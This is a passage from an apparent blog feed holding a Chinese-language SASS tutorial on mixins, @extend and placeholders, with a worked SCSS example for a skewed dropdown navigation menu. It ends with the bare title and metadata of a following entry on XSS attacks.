class="keyword">extend</span> %grid;</span><br><span class="line">  <span class="attribute">width</span>: percentage(<span class="variable">$width</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">for</span> <span class="variable">$column</span> from 1 through <span class="variable">$columns</span> &#123;</span><br><span class="line">  <span class="selector-class">.grid-</span>#&#123;<span class="variable">$column</span>&#125; &#123;</span><br><span class="line">    @<span class="keyword">include</span> grid(<span class="number">1</span> / <span class="variable">$column</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用Mixins和继承的细节"><a href="#使用Mixins和继承的细节" class="headerlink" title="使用Mixins和继承的细节"></a>使用Mixins和继承的细节</h2><p>了解了<code>@include</code>定义的<code>@mixin</code>,<code>@extend</code>定义的<code>.class</code>和<code>@extend</code>定义的<code>%placeholders</code>差异之后，我们在写SASS时，有一些细节大家应该了解：</p><ul><li>不要使用没有设置参数的<code>@mixin</code>，他们应该是<code>.class</code>或者<code>%placeholders</code>;</li><li>不要轻意（从不使用）<code>@extend</code>调用<code>.class</code>。会得到你意想不到的结果，特别是定义的<code>.class</code>出现在嵌套或其他的样式表中，你应该使用<code>@extend</code>调用<code>%placeholders</code>;</li><li>不要使用太深的选择器嵌套。</li><li>如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低；</li><li>不要使用子选择器符号<code>&gt;</code>，在SASS中很无效；</li><li>不要使用同史选择器<code>+</code>，配合你当前的标记他是非常无效。</li><li>不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差；</li></ul><h2 id="案例实战"><a href="#案例实战" class="headerlink" title="案例实战"></a>案例实战</h2><p><img src="/view/posts/ea50967e/%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98.gif" alt="案例实战"></p><p>1.<code>html</code>结构</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>博客<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"drop-menu"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>CSS3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>SASS<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>JavaScript<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>案例<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>资源<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>前端收藏夹<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下：</p><ul><li><strong>定义变量</strong>：我要定义几个变量，方便换成别的风格；</li><li><strong>清除浮动</strong>：列表使用了浮动，需要清除浮动</li><li><strong>清除列表默认样式</strong>：导航是使用ul制作，所以需要清除其默认样式</li><li><strong>定义transfrom</strong>：效果中使用到了CSS3的transform，使用<code>@mixin</code>定义成一个模块</li><li><strong>定义transition</strong>：下拉菜单出现的时候有一个transition效果</li><li><strong>定义fit-content</strong>：使用CSS3的fit-content</li><li><strong>定义box-shadow</strong>：使用CSS3的box-shadow</li><li><strong>定义文本</strong>：设置菜单项文本效果</li></ul><ol><li>定义变量</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.定义变量</span></span><br><span class="line"><span class="variable">$color</span>: <span class="number">#fff</span> !default; <span class="comment">//设置文本颜色</span></span><br><span class="line"><span class="variable">$bgColor</span>: <span class="number">#34495e</span> !default;<span class="comment">//设置背景色</span></span><br><span class="line"><span class="variable">$sfbgColor</span>: <span class="number">#e74c3c</span> !default;<span class="comment">//设置悬浮背景色</span></span><br><span class="line"><span class="variable">$fontSize</span>: <span class="number">14px</span> !default;<span class="comment">//设置字号</span></span><br><span class="line"><span class="variable">$fontFamily</span>: Arial, Helvetica !default;<span class="comment">//设置字体</span></span><br><span class="line"><span class="variable">$width</span>: <span class="number">462px</span> !default; <span class="comment">//设置默认宽度</span></span><br></pre></td></tr></table></figure><ol start="2"><li>清除浮动</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.使用%placeholders定义清除浮动</span></span><br><span class="line">%clearfix &#123;</span><br><span class="line">  &amp;&#123;</span><br><span class="line">    *zoom: <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &amp;:before,</span><br><span class="line">  &amp;:after&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">  &#125;</span><br><span class="line">  &amp;:after &#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>清除列表默认样式</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//3.清除列表默认样式</span></span><br><span class="line">%listStyle &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;    <span class="attribute">list-style</span>: none outside none;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$prefix-for-webkit</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-mozilla</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-microsoft</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-opera</span>: true !default;</span><br><span class="line"><span class="variable">$prefix-for-spec</span>: true !default;</span><br></pre></td></tr></table></figure><ol start="4"><li>定义transfrom</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4.浏览器前缀</span></span><br><span class="line">@<span class="keyword">mixin</span> prefixer (<span class="variable">$property</span>, <span class="variable">$value</span>, <span class="variable">$prefixes</span>) &#123;</span><br><span class="line">  @<span class="keyword">each</span> <span class="variable">$prefix</span> in <span class="variable">$prefixes</span> &#123;</span><br><span class="line">    @<span class="keyword">if</span> <span class="variable">$prefix</span> == webkit and <span class="variable">$prefix-for-webkit</span> == true &#123;</span><br><span class="line">      -webkit-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$prefix</span> == moz and <span class="variable">$prefix-for-mozilla</span> == true &#123;</span><br><span class="line">      -moz-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$prefix</span> == ms and <span class="variable">$prefix-for-microsoft</span> == true &#123;</span><br><span class="line">      -ms-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$prefix</span> == o and <span class="variable">$prefix-for-opera</span> == true &#123;</span><br><span class="line">      -o-#&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125; @<span class="keyword">else</span> if <span class="variable">$prefix</span> == spec and <span class="variable">$prefix-for-spec</span> == true &#123;</span><br><span class="line">      #&#123;<span class="variable">$property</span>&#125;: <span class="variable">$value</span>;</span><br><span class="line">    &#125; @<span class="keyword">else</span> &#123;</span><br><span class="line">      @<span class="keyword">warn</span> <span class="string">"Unrecognized prefix: #&#123;$prefix&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>定义transition</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//5.定义transform</span></span><br><span class="line"><span class="comment">//示例: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class="line"><span class="comment">//Transform, transform-origin, transform-style</span></span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">@<span class="keyword">mixin</span> transform(<span class="variable">$property</span>...) &#123;</span><br><span class="line">  @<span class="keyword">include</span> prefixer(transform, <span class="variable">$property</span>, webkit moz o ms spec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> transform-origin(<span class="variable">$axes</span>: 50%) &#123;</span><br><span class="line">  <span class="comment">// x-axis - left | center | right  | length | %</span></span><br><span class="line">  <span class="comment">// y-axis - top  | center | bottom | length | %</span></span><br><span class="line">  <span class="comment">// z-axis - length</span></span><br><span class="line">  @<span class="keyword">include</span> prefixer(transform-origin, <span class="variable">$axes</span>, webkit moz o ms spec);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">mixin</span> skewX(<span class="variable">$degrees</span>) &#123;</span><br><span class="line">  @<span class="keyword">include</span> prefixer(transform, skewX(<span class="variable">$degrees</span>), webkit moz o ms spec);</span><br><span class="line">  -webkit-<span class="attribute">backface-visibility</span>: hidden;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>定义fit-content</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//6.定义transition</span></span><br><span class="line"><span class="comment">// Return vendor-prefixed property names if appropriate</span></span><br><span class="line"><span class="comment">// Example: transition-property-names((transform, color, background), moz) -&gt; -moz-transform, color, background//----------------------------------------</span></span><br><span class="line">@function transition-property-names(<span class="variable">$props</span>, <span class="variable">$vendor</span>: false) &#123;</span><br><span class="line">  <span class="variable">$new-props</span>: ();</span><br><span class="line">  @<span class="keyword">each</span> <span class="variable">$prop</span> in <span class="variable">$props</span> &#123;</span><br><span class="line">    <span class="variable">$new-props</span>: append(<span class="variable">$new-props</span>, transition-property-name(<span class="variable">$prop</span>, <span class="variable">$vendor</span>), comma);</span><br><span class="line">  &#125;</span><br><span class="line">  @return <span class="variable">$new-props</span>;</span><br><span class="line">&#125;</span><br><span class="line">@function transition-property-name(<span class="variable">$prop</span>, <span class="variable">$vendor</span>: false) &#123;</span><br><span class="line">  <span class="comment">// put other properties that need to be prefixed here aswell</span></span><br><span class="line">  @<span class="keyword">if</span> <span class="variable">$vendor</span> and <span class="variable">$prop</span> == transform &#123;</span><br><span class="line">    @return unquote(<span class="string">'-'</span>+<span class="variable">$vendor</span>+<span class="string">'-'</span>+<span class="variable">$prop</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  @<span class="keyword">else</span> &#123;</span><br><span class="line">    @return <span class="variable">$prop</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// transition</span></span><br><span class="line"><span class="comment">//----------------------------------------</span></span><br><span class="line">@<span class="keyword">mixin</span> transition (<span class="variable">$properties</span>...) &#123;</span><br><span class="line">  @<span class="keyword">if</span> length(<span class="variable">$properties</span>) &gt;= 1 &#123;</span><br><span class="line">    @<span class="keyword">include</span> prefixer(transition, <span class="variable">$properties</span>, webkit moz o ms spec);</span><br><span class="line">  &#125; @<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$properties</span>: all <span class="number">0.15s</span> ease-out <span class="number">0</span>;</span><br><span class="line">    @<span class="keyword">include</span> prefixer(transition, <span class="variable">$properties</span>, webkit moz o ms spec);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>定义fit-content</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//7.定义fit-content</span></span><br><span class="line">@<span class="keyword">mixin</span> fit-content &#123;</span><br><span class="line">  <span class="attribute">width</span>: -webkit-fit-content;</span><br><span class="line">  <span class="attribute">width</span>: -moz-fit-content;</span><br><span class="line">  <span class="attribute">width</span>: -o-fit-content;</span><br><span class="line">  <span class="attribute">width</span>: -ms-fit-content;</span><br><span class="line">  <span class="attribute">width</span>: fit-content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>定义box-shadow</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//8.设置box-shadow</span></span><br><span class="line"><span class="comment">// box-shadow</span></span><br><span class="line">@<span class="keyword">mixin</span> box-shadow(<span class="variable">$shadow</span>...) &#123;</span><br><span class="line">  @<span class="keyword">include</span> prefixer(box-shadow, <span class="variable">$shadow</span>, webkit spec);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>定义文本</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//9.设置文本</span></span><br><span class="line">%typography &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">$color</span>;</span><br><span class="line">  text: &#123;</span><br><span class="line">    decoration: none;</span><br><span class="line">    align: center;</span><br><span class="line">  &#125;   </span><br><span class="line">  <span class="attribute">font</span>: &#123;</span><br><span class="line">    family: <span class="variable">$fontFamily</span>;</span><br><span class="line">    size: <span class="variable">$fontSize</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="10"><li>具体样式</li></ol><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 10.具体样式</span></span><br><span class="line"><span class="selector-class">.menu</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$width</span>;</span><br><span class="line">  @<span class="keyword">extend</span> %clearfix;<span class="comment">//调用清除浮动</span></span><br><span class="line">  @<span class="keyword">extend</span> %listStyle;<span class="comment">//调用清除列表样式</span></span><br><span class="line">  @<span class="keyword">include</span> fit-content;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">50px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.drop-menu</span> &#123;</span><br><span class="line">  @<span class="keyword">extend</span> %listStyle;<span class="comment">//调用清除列表样式</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="variable">$bgColor</span>;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">position</span>: relative;    @<span class="keyword">include</span> skewX(<span class="number">25deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  @<span class="keyword">extend</span> %typography;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-tag">li</span>:hover &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="variable">$sfbgColor</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span> &gt; <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">1em</span> <span class="number">2em</span>;</span><br><span class="line">  @<span class="keyword">include</span> skewX(-<span class="number">25deg</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*Dropdown menu*/</span></span><br><span class="line"><span class="selector-class">.drop-menu</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="variable">$width</span> / <span class="number">4</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">  <span class="attribute">margin-left</span>: -(<span class="variable">$width</span> / <span class="number">8</span>);</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">visibility</span>: hidden;</span><br><span class="line">  @<span class="keyword">include</span> skewX(-<span class="number">25deg</span>);</span><br><span class="line">  @<span class="keyword">include</span> transform-origin(left top);</span><br><span class="line">  <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="variable">$bgColor</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">visibility</span>: hidden;</span><br><span class="line">    @<span class="keyword">include</span> transition(all .2s ease );</span><br><span class="line">    <span class="selector-tag">a</span> &#123;</span><br><span class="line">      <span class="attribute">padding</span>: <span class="number">1em</span> <span class="number">2em</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;::after &#123;</span><br><span class="line">      <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">      <span class="attribute">position</span>: absolute;</span><br><span class="line">      <span class="attribute">top</span>: -<span class="number">125%</span>;</span><br><span class="line">      <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">      @<span class="keyword">include</span> box-shadow(<span class="number">0</span> 0 50px rgba(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,.<span class="number">9</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:nth-child(odd) &#123;</span><br><span class="line">      @<span class="keyword">include</span> transform(skewX(-<span class="number">25deg</span>) translateX(<span class="number">0</span>));</span><br><span class="line">      <span class="selector-tag">a</span> &#123;</span><br><span class="line">        @<span class="keyword">include</span> skewX(<span class="number">25deg</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &amp;::after &#123;</span><br><span class="line">        <span class="attribute">right</span>: -<span class="number">50%</span>;</span><br><span class="line">        @<span class="keyword">include</span> transform(skewX(-<span class="number">25deg</span>) rotate(<span class="number">3deg</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:nth-child(even)&#123;</span><br><span class="line">      @<span class="keyword">include</span> transform(skewX(<span class="number">25deg</span>) translateX(<span class="number">0</span>));</span><br><span class="line">      <span class="selector-tag">a</span> &#123;</span><br><span class="line">        @<span class="keyword">include</span> skewX(-<span class="number">25deg</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &amp;::after &#123;</span><br><span class="line">        <span class="attribute">left</span>: -<span class="number">50%</span>;</span><br><span class="line">        @<span class="keyword">include</span> transform(skewX(<span class="number">25deg</span>) rotate(<span class="number">3deg</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span>:hover <span class="selector-class">.drop-menu</span>,</span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span>:hover <span class="selector-class">.drop-menu</span> <span class="selector-tag">li</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">visibility</span>: visible;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span>:hover <span class="selector-class">.drop-menu</span> <span class="selector-tag">li</span>:nth-child(even)&#123;</span><br><span class="line">  @<span class="keyword">include</span> transform(skewX(<span class="number">25deg</span>) translateX(<span class="number">15px</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &gt; <span class="selector-tag">li</span>:hover <span class="selector-class">.drop-menu</span> <span class="selector-tag">li</span>:nth-child(odd)&#123;</span><br><span class="line">  @<span class="keyword">include</span> transform(skewX(-<span class="number">25deg</span>) translateX(-<span class="number">15px</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="阅读"><a href="#阅读" class="headerlink" title="阅读"></a>阅读</h2><ul><li><a href="https://www.sass.hk/" target="_blank" rel="noopener">Sass中文网</a></li><li><a href="https://www.w3cplus.com/preprocessor/sass-basic-syntax-and-features.html" target="_blank" rel="noopener">SASS基础教程——SASS基本语法与特性</a></li><li><a href="https://www.w3cplus.com/preprocessor/sass-basic-variable.html" target="_blank" rel="noopener">sass揭秘之变量</a></li><li><a href="https://www.w3cplus.com/preprocessor/sass-basic-mixins-nesting-placeholders-extend.html" target="_blank" rel="noopener">理解SASS的嵌套，@extend，%Placeholders和Mixins</a></li><li>在线编辑SCSS工具：<a href="https://www.sassmeister.com/" target="_blank" rel="noopener">sassmeister</a></li><li><a href="https://www.cnblogs.com/dingyufenglian/p/4864392.html" target="_blank" rel="noopener">sass揭秘之@if，@for，@each（转载）</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SASS&quot;&gt;&lt;a href=&quot;#SASS&quot; class=&quot;headerlink&quot; title=&quot;SASS&quot;&gt;&lt;/a&gt;SASS&lt;/h1&gt;&lt;h2 id=&quot;什么是SASS&quot;&gt;&lt;a href=&quot;#什么是SASS&quot; class=&quot;headerlink&quot; title=&quot;什么是
      
    
    </summary>
    
      <category term="CSS" scheme="http://yoursite.com/categories/CSS/"/>
    
    
      <category term="SCSS" scheme="http://yoursite.com/tags/SCSS/"/>
    
  </entry>
  
  <entry>
    <title>XXS攻击</title>
    <link href="http://yoursite.com/posts/12cd2a8e.html"/>
    <id>http://yoursite.com/posts/12cd2a8e.html</id>
    <published>2020-03-04T06:58:20.000Z</published>
    <updated>2020-06-22T10:05:06.380Z</updated>
    
